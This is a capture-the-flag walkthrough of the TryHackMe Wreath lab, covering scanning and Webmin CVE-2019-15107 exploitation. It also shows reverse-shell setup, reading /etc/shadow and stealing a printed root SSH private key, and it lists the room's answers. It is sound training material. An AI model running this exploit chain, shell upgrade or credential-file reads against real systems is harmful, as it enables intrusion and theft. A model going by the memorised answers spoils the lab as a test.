This article is a write-up for the Wreath room on THM.
Wreath room consists of a total of 46 Tasks, structured around practical penetration testing of a server network covering pivoting, C2 frameworks, vulnerability analysis, and more.
Detailed information about the room can be found at the link below.
https://tryhackme.com/room/wreath

### \[ Task4 - Brief (Intro) \]
※Task1, 2, 3 are network connection and background explanation stages, so we will skip them.

Thomas provided information indicating that the network consists of a total of 3 machines.
The first is a port-forwarded public web server, which serves as the initial entry point for penetration.
The second is an internal Git server where Thomas pushes code from his personal PC, making it likely that sensitive information has been left behind.
The third is Thomas's personal PC, which runs a Windows Server version, has antivirus active, and cannot be accessed directly from outside.
The attack flow is structured as follows: initial penetration through web server vulnerabilities, then moving to the internal Git server, and finally targeting the Windows PC. Given that the Windows PC has antivirus installed, AV bypass techniques will likely be required at a later stage.

### \[ Task5 - Enumeration (Webserver) \]
The goal of Task5 is to scan the target with Nmap and then access the website to search for vulnerabilities in running services.
When using Nmap, you can save time by quickly identifying open ports and then performing a detailed scan only on those specific ports.

**Command (Full Port Scan):**
```bash
nmap -p- --min-rate 3000 <IP>
#Scan all ports sending at least 3000 packets per second
```
**Result:**
```bash
┌──(root㉿jaejun835)-[~]
└─# nmap -p- --min-rate 3000 10.200.180.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-17 17:35 PST
Nmap scan report for thomaswreath.thm (10.200.180.200)
Host is up (0.21s latency).
Not shown: 65511 filtered tcp ports (no-response), 21 filtered tcp ports (admin-prohibited)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap scan report for 10.200.180.250
Host is up (0.21s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  waste

Nmap done: 256 IP addresses (2 hosts up) scanned in 68.98 seconds
```
As a result of running the command, we confirmed the target web server and a server presumed to be a gateway or management server.
First, let's perform a detailed scan on the target web server to search for vulnerabilities.

**Command (Detailed Scan on Open Ports):**
```bash
nmap -p <open ports> --min-rate 3000 -vv -A <IP>
#-A   →  OS, service version, script scan
#-vv  →  print results in real time during scan
```
**Result:**
```bash
┌──(root㉿jaejun835)-[~]
└─# nmap -p 22,80,443,10000 --min-rate 3000 -vv -A 10.200.180.200
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-17 17:29 PST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:29
Completed NSE at 17:29, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:29
Completed NSE at 17:29, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:29
Completed NSE at 17:29, 0.00s elapsed
Initiating Ping Scan at 17:29
Scanning 10.200.180.200 [4 ports]
Completed Ping Scan at 17:29, 0.26s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:29
Scanning thomaswreath.thm (10.200.180.200) [4 ports]
Discovered open port 22/tcp on 10.200.180.200
Discovered open port 443/tcp on 10.200.180.200
Discovered open port 80/tcp on 10.200.180.200
Discovered open port 10000/tcp on 10.200.180.200
Completed SYN Stealth Scan at 17:29, 0.32s elapsed (4 total ports)
Initiating Service scan at 17:29
Scanning 4 services on thomaswreath.thm (10.200.180.200)
Completed Service scan at 17:29, 13.19s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against thomaswreath.thm (10.200.180.200)
Retrying OS detection (try #2) against thomaswreath.thm (10.200.180.200)
Initiating Traceroute at 17:29
Completed Traceroute at 17:29, 0.22s elapsed
Initiating Parallel DNS resolution of 1 host. at 17:29
Completed Parallel DNS resolution of 1 host. at 17:29, 0.02s elapsed
NSE: Script scanning 10.200.180.200.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:29
Completed NSE at 17:29, 30.23s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:29
Completed NSE at 17:29, 2.52s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:29
Completed NSE at 17:29, 0.00s elapsed
Nmap scan report for thomaswreath.thm (10.200.180.200)
Host is up, received echo-reply ttl 63 (0.21s latency).
Scanned at 2026-03-17 17:29:07 PST for 52s

PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfKbbFLiRV9dqsrYQifAghp85qmXpYEHf2g4JJqDKUL316TcAoGj62aamfhx5isIJHtQsA0hVmzD+4pVH4r8ANkuIIRs6j9cnBrLGpjk8xz9+BE1Vvd8lmORGxCqTv+9LgrpB7tcfoEkIOSG7zeY182kOR72igUERpy0JkzxJm2gIGb7Caz1s5/ScHEOhGX8VhNT4clOhDc9dLePRQvRooicIsENqQsLckE0eJB7rTSxemWduL+twySqtwN80a7pRzS7dzR4f6fkhVBAhYflJBW3iZ46zOItZcwT2u0wReCrFzxvDxEOewH7YHFpvOvb+Exuf3W6OuSjCHF64S7iU6z92aINNf+dSROACXbmGnBhTlGaV57brOXzujsWDylivWZ7CVVj1gB6mrNfEpBNE983qZskyVk4eTNT5cUD+3I/IPOz1bOtOWiraZCevFYaQR5AxNmx8sDIgo1z4VcxOMhrczc7RC/s3KWcoIkI2cI5+KUnDtaOfUClXPBCgYE50=
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFccvYHwpGWYUsw9mTk/mEvzyrY4ghhX2D6o3n/upTLFXbhJPV6ls4C8O0wH6TyGq7ClV3XpVa7zevngNoqlwzM=
|   256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINLfVtZHSGvCy3JP5GX0Dgzcxz+Y9In0TcQc3vhvMXCP
80/tcp    open  http     syn-ack ttl 63 Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://thomaswreath.thm
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
443/tcp   open  ssl/http syn-ack ttl 63 Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB/localityName=Easingwold/emailAddress=me@thomaswreath.thm
| Issuer: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB/localityName=Easingwold/emailAddress=me@thomaswreath.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-17T09:11:01
| Not valid after:  2027-03-17T09:11:01
| MD5:   cbc5:0609:f683:21ae:9d47:ea5d:a287:c369
| SHA-1: d717:1d1c:8bad:e6de:72f3:68b4:b8be:dc0d:7a17:4d35
| -----BEGIN CERTIFICATE-----
| MIIELTCCAxWgAwIBAgIUFU1+moxTgDtuoTF2+ih26Ppck74wDQYJKoZIhvcNAQEL
| BQAwgaUxCzAJBgNVBAYTAkdCMR4wHAYDVQQIDBVFYXN0IFJpZGluZyBZb3Jrc2hp
| cmUxEzARBgNVBAcMCkVhc2luZ3dvbGQxIjAgBgNVBAoMGVRob21hcyBXcmVhdGgg
| RGV2ZWxvcG1lbnQxGTAXBgNVBAMMEHRob21hc3dyZWF0aC50aG0xIjAgBgkqhkiG
| 9w0BCQEWE21lQHRob21hc3dyZWF0aC50aG0wHhcNMjYwMzE3MDkxMTAxWhcNMjcw
| MzE3MDkxMTAxWjCBpTELMAkGA1UEBhMCR0IxHjAcBgNVBAgMFUVhc3QgUmlkaW5n
| IFlvcmtzaGlyZTETMBEGA1UEBwwKRWFzaW5nd29sZDEiMCAGA1UECgwZVGhvbWFz
| IFdyZWF0aCBEZXZlbG9wbWVudDEZMBcGA1UEAwwQdGhvbWFzd3JlYXRoLnRobTEi
| MCAGCSqGSIb3DQEJARYTbWVAdGhvbWFzd3JlYXRoLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAK/iA2d0xGxXDohyI0Krij4+P7d1dZcRt+bAfyeJ
| K0x0G0wULC9mh4QSR+VMd8twaJo91YQ+9C0vQ0L6Sqdf/12zsEd90GGyDRMFuAfE
| GYdW0/QAw5zi+zfeCyGlT4XQ23av2A+6y9gmhH9Od/FCrtUsmRo2OgJNKt5/TBKb
| eAu2eP+GedXXfEqw+rsnr1CrV6jMrNhEasty0he5oFA17qp8b31Nq3yvMFp9Cylb
| SQ7103ZP9zsEXRjyLj9vvFbmNI4Fq4z4lexQzwh++APJK2TJKY62U/crldfJgJkt
| dlHF4Y+qxdkDDXaLJrTeit8jpyevZgv9uU8kW5/6oHcKSpUCAwEAAaNTMFEwHQYD
| VR0OBBYEFF3K9X/yE4dNd4aPzgw7+C9dSuOcMB8GA1UdIwQYMBaAFF3K9X/yE4dN
| d4aPzgw7+C9dSuOcMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AGUxWzHaV+VUYZJ9FjmJH2Fm5bgNfZu+j85jgcD7TGNWcnnfVYD5kT43xS1wkjAl
| cWdMYz8uw6EqeqkeNhxTG+Icsf16o7W0uz3gQBCuZyU+CcOiUju6OkjFfi3lmVox
| D4fRkz00qMy/45yYepaHOvZOFmo9OuRiNo8oLPXQgyaA3VXhS4YoHQosm2MR1AtT
| Ybed+CtcqhnqroMcYyPtoHiTT1ax9j1vePFuvrgCE0+9qKwTSZCWO9bJQU/c0hk+
| zVELtKDMhxOwT26huGqWtxDUeCzbV5cOJsmwEQt32N9wNfYdUENBiU4b+LES3DPM
| 95JXSa+Cdzb/A4Qsrkhodyw=
|_-----END CERTIFICATE-----
| http-methods:
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_ssl-date: TLS randomness does not represent time
|_http-title: Thomas Wreath | Developer
10000/tcp open  http     syn-ack ttl 63 MiniServ 1.890 (Webmin httpd)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-favicon: Unknown favicon MD5: A2FC307C608628C8C0EFAAD475EB05B3
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 (97%), Linux 4.4 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), Linux 2.6.32 - 3.10 (91%), Linux 3.10 - 3.13 (90%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=3/17%OT=22%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=69B91F17%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=107%TI=Z%TS=A)
SEQ(SP=103%GCD=1%ISR=10D%TI=Z%II=I%TS=A)
OPS(O1=M509ST11NW7%O2=M509ST11NW7%O3=M509NNT11NW7%O4=M509ST11NW7%O5=M509ST11NW7%O6=M509ST11)
WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
ECN(R=Y%DF=Y%TG=40%W=6903%O=M509NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 47.411 days (since Thu Jan 29 07:38:37 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   211.43 ms 10.250.180.1
2   211.55 ms thomaswreath.thm (10.200.180.200)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:29
Completed NSE at 17:29, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:29
Completed NSE at 17:29, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:29
Completed NSE at 17:29, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.44 seconds
           Raw packets sent: 86 (7.372KB) | Rcvd: 47 (6.934KB)
```
As a result of running the command, we scanned service version information, the domain (thomaswreath.thm), email (me@thomaswreath.thm), and more.
Next, when accessing port 80, it redirects to the domain (thomaswreath.thm), and if that domain is not registered in the actual DNS, the browser may display an error ("Site cannot be found").
To prevent this, we will manually register the domain in the /etc/hosts file.

**Command:**
```bash
echo "<IP> <domain>" >> /etc/hosts
#Manually register the domain in the /etc/hosts file
```
**Result:**
```bash
┌──(root㉿jaejun835)-[~]
└─# sudo sh -c 'echo "10.200.180.200    thomaswreath.thm" >> /etc/hosts'
```
Now that domain registration in /etc/hosts is complete, let's access thomaswreath.thm in the browser to analyze the target's webpage and collect publicly available information.

**Screenshot:**

(image)

As a result of browser exploration, we confirmed publicly available information such as the target's address, phone number, and email.
This information can be used in real penetration tests for social engineering or password guessing attacks.
Finally, let's search for a CVE based on the information gathered so far to gain initial access.

**CVE:**

(image)

As a result of the search, we identified CVE-2019-15107.
This vulnerability is an Unauthenticated RCE (Remote Code Execution) found in Webmin versions 1.890 ~ 1.920 with a CVSS score of 9.0 (Critical).
A backdoor was inserted into the Webmin installation file distributed via SourceForge, and remote code execution is possible through the old and expired parameters of password_change.cgi.

**Task5 Answer:**
```bash
How many of the first 15000 ports are open on the target?
#4

What OS does Nmap think is running?
#CentOS

what site does the server try to redirect you to?
#https://thomaswreath.thm

What is Thomas' mobile phone number?
#+447821548812

what server version does Nmap detect as running here?
#MiniServ 1.890 (Webmin httpd)

What is the CVE number for this exploit?
#CVE-2019-15107
```
### \[ Task6 - Exploitation (Webserver) \]
The goal of Task6 is to exploit the CVE-2019-15107 vulnerability found earlier to penetrate the web server and establish persistent access.
First, we downloaded the exploit code using git.

**Command:**
```bash
git clone https://github.com/MuirlandOracle/CVE-2019-15107
```
**Result:**
```bash
┌──(root㉿jaejun835)-[~]
└─# git clone https://github.com/MuirlandOracle/CVE-2019-15107
Cloning into 'CVE-2019-15107'...
remote: Enumerating objects: 48, done.
remote: Counting objects: 100% (48/48), done.
remote: Compressing objects: 100% (34/34), done.
remote: Total 48 (delta 21), reused 27 (delta 11), pack-reused 0 (from 0)
Receiving objects: 100% (48/48), 22.37 KiB | 789.00 KiB/s, done.
Resolving deltas: 100% (21/21), done.
```
Now that the exploit code has been downloaded, let's navigate to the folder and install the required Python libraries.

**Command:**
```bash
cd CVE-2019-15107 && pip3 install -r requirements.txt --break-system-packages
#Install libraries listed in requirements.txt, forcefully ignoring system restrictions
```
**Result:**
```bash
┌──(root㉿jaejun835)-[~/CVE-2019-15107]
└─# cd CVE-2019-15107 && pip3 install -r requirements.txt --break-system-packages
Collecting argparse (from -r requirements.txt (line 1))
  Downloading argparse-1.4.0-py2.py3-none-any.whl.metadata (2.8 kB)
Requirement already satisfied: requests in /usr/lib/python3/dist-packages (from -r requirements.txt (line 2)) (2.32.5)
Requirement already satisfied: urllib3 in /usr/lib/python3/dist-packages (from -r requirements.txt (line 3)) (2.5.0)
Requirement already satisfied: prompt_toolkit in /usr/lib/python3/dist-packages (from -r requirements.txt (line 4)) (3.0.52)
Requirement already satisfied: charset_normalizer<4,>=2 in /usr/lib/python3/dist-packages (from requests->-r requirements.txt (line 2)) (3.4.3)
Requirement already satisfied: idna<4,>=2.5 in /usr/lib/python3/dist-packages (from requests->-r requirements.txt (line 2)) (3.10)
Requirement already satisfied: certifi>=2017.4.17 in /usr/lib/python3/dist-packages (from requests->-r requirements.txt (line 2)) (2025.1.31)
Requirement already satisfied: wcwidth in /usr/lib/python3/dist-packages (from prompt_toolkit->-r requirements.txt (line 4)) (0.2.13)
Downloading argparse-1.4.0-py2.py3-none-any.whl (23 kB)
Installing collected packages: argparse
Successfully installed argparse-1.4.0
WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager, possibly rendering your system unusable. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv. Use the --root-user-action option if you know what you are doing and want to suppress this warning.
```
Library installation completed successfully. Now let's run the exploit to attempt to obtain a shell on the target server.

**Command:**
```bash
./CVE-2019-15107.py 10.200.180.200
```
**Result:**
```bash
┌──(root㉿jaejun835)-[~/CVE-2019-15107]
└─# ./CVE-2019-15107.py 10.200.180.200

        __        __   _               _         ____   ____ _____
        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|
         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|
          \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___
           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|

                                                @MuirlandOracle


[*] Server is running in SSL mode. Switching to HTTPS
[+] Connected to https://10.200.180.200:10000/ successfully.
[+] Server version (1.890) should be vulnerable!
[+] Benign Payload executed!

[+] The target is vulnerable and a pseudoshell has been obtained.
Type commands to have them executed on the target.
[*] Type 'exit' to exit.
[*] Type 'shell' to obtain a full reverse shell (UNIX only).

# whoami
root
#
```
As a result of running the exploit, we successfully obtained a pseudoshell and confirmed via the whoami command that the server is running with **root** privileges.
However, the obtained pseudoshell is unstable and some commands may be restricted.
Therefore, let's upgrade to a more stable reverse shell.
※A pseudoshell is unstable because the exploit sends commands one by one via HTTP requests, whereas a reverse shell is more stable because the target server directly establishes a TCP connection to the attacking machine, enabling two-way communication.

**Command (pseudoshell):**
```bash
1.shell
2.Enter attacker IP address
3.Reverse shell listener port number
```
**Result:**
```bash
# shell

[*] Starting the reverse shell process
[*] For UNIX targets only!
[*] Use 'exit' to return to the pseudoshell at any time
Please enter the IP address for the shell: <IP>
Please enter the port number for the shell: 4444

[*] Start a netcat listener in a new window (nc -lvnp 4444) then press enter.

[+] You should now have a reverse shell on the target
[*] If this is not the case, please check your IP and chosen port
If these are correct then there is likely a firewall preventing the reverse connection. Try choosing a well-known port such as 443 or 53
#
```
**Command (Reverse Shell Listener):**
```bash
nc -lvnp 4444
#Run on port number 4444
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...

connect to [10.250.180.9] from (UNKNOWN) [10.200.180.200] 54874
sh: cannot set terminal process group (1830): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4#
```
As a result of execution, we successfully obtained a reverse shell.
The basic reverse shell is also unstable and limits arrow keys and autocomplete, so let's stabilize the shell using the python3 pty module.

**Command:**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Create a virtual terminal using the python3 pty module
# Runs /bin/bash shell like a proper terminal

export TERM=xterm
# Set terminal type to xterm
# Enables terminal features such as arrow keys and autocomplete

^Z
# Send the current shell to background with Ctrl+Z

stty raw -echo; fg
# raw    → Passes key input directly to target (arrow keys, etc.)
# -echo  → Prevents input typed on the attacking machine from being printed twice
# fg     → Brings the nc shell sent to background back to foreground
```
**Result:**
```bash
sh-4.4# python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
[root@prod-serv ]# export TERM=xterm
export TERM=xterm
[root@prod-serv ]# ^Z
zsh: suspended  nc -lvnp 4444

┌──(jaejun835㉿jaejun835)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

[root@prod-serv ]#
```
Now that initial access and shell stabilization are complete, let's move on to the post-exploitation phase.
We will collect the root account's password hash and obtain an SSH key to establish persistent access.

**Command:**
```bash
cat /etc/shadow
```
**Result:**
```bash
[root@prod-serv ]# cat /etc/shadow
root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::
bin:*:18358:0:99999:7:::
daemon:*:18358:0:99999:7:::
adm:*:18358:0:99999:7:::
lp:*:18358:0:99999:7:::
sync:*:18358:0:99999:7:::
shutdown:*:18358:0:99999:7:::
halt:*:18358:0:99999:7:::
mail:*:18358:0:99999:7:::
operator:*:18358:0:99999:7:::
games:*:18358:0:99999:7:::
ftp:*:18358:0:99999:7:::
nobody:*:18358:0:99999:7:::
dbus:!!:18573::::::
systemd-coredump:!!:18573::::::
systemd-resolve:!!:18573::::::
tss:!!:18573::::::
polkitd:!!:18573::::::
libstoragemgmt:!!:18573::::::
cockpit-ws:!!:18573::::::
cockpit-wsinstance:!!:18573::::::
sssd:!!:18573::::::
sshd:!!:18573::::::
chrony:!!:18573::::::
rngd:!!:18573::::::
twreath:$6$0my5n311RD7EiK3J$zVFV3WAPCm/dBxzz0a7uDwbQenLohKiunjlDonkqx1huhjmFYZe0RmCPsHmW3OnWYwf8RWPdXAdbtYpkJCReg.::0:99999:7:::
unbound:!!:18573::::::
apache:!!:18573::::::
nginx:!!:18573::::::
mysql:!!:18573::::::
```
```bash
root hash : 6i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1
```
As a result of running cat /etc/shadow, we obtained the root account's password hash.
Since this hash is encrypted using SHA-512 and is difficult to crack, let's move on to the SSH key file connection step.

**Command:**
```bash
find / -name "id_*" 2>/dev/null
```
**Result:**
```bash
[root@prod-serv ]# find / -name "id_*" 2>/dev/null
/root/.ssh/id_rsa
/root/.ssh/id_rsa.pub
/usr/share/locale/id_ID
/usr/share/sssd/systemtap/id_perf.stp
```
As a result of running the find command, we discovered the root account's SSH private key file at the path /root/.ssh/id_rsa.
Next, let's copy the private key contents and save them to the local shell for SSH access.

**Command:**
```bash
cat /root/.ssh/id_rsa
#Copy from reverse shell

nano id_rsa.txt
#Paste in local shell
```
**Result:**
```bash
[root@prod-serv ]# cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ nano id_rsa.txt
```
Now that we have created the SSH private key file in the local shell, let's set permissions using the chmod 600 command and then attempt SSH access.
※This is because SSH will refuse connection for security reasons if the private key file permissions are not 600.

**Command:**
```bash
chmod 600 id_rsa.txt
# Set private key file permissions
# Allow only the owner to read/write
# SSH will refuse connection if private key permissions are not 600

ssh -i id_rsa.txt root@<IP>
# -i → Specify private key file
```
**Result:**
```bash
┌──(jaejun835㉿jaejun835)-[~]
└─$ chmod 600 id_rsa.txt

┌──(jaejun835㉿jaejun835)-[~]
└─$ ssh -i id_rsa.txt root@10.200.180.200
The authenticity of host '10.200.180.200 (10.200.180.200)' can't be established.
ED25519 key fingerprint is SHA256:7Mnhtkf/5Cs1mRaS3g6PGYXnU8u8ajdIqKU9lQpmYL4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.200.180.200' (ED25519) to the list of known hosts.
[root@prod-serv ~]#
```
As a result of running the command, SSH connection was successful.

**Answer:**
```bash
Which user was the server running as?
#root

What is the root user's password hash?
#6i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1


What is the full path to this file?
#/root/.ssh/id_rsa
```
### \[ Task8 - High-level Overview (Pivoting) \]
Task7, 8 are concept explanation stages, so we will briefly skip them.

**Answer:**
```bash
Which type of pivoting creates a channel through which information can be sent hidden inside another protocol?
#Tunnelling

Research: Not covered in this Network, but good to know about. Which Metasploit Framework Meterpreter command can be used to create a port forward?
#portfwd
```
### \[ Task9 - Enumeration (Pivoting) \]
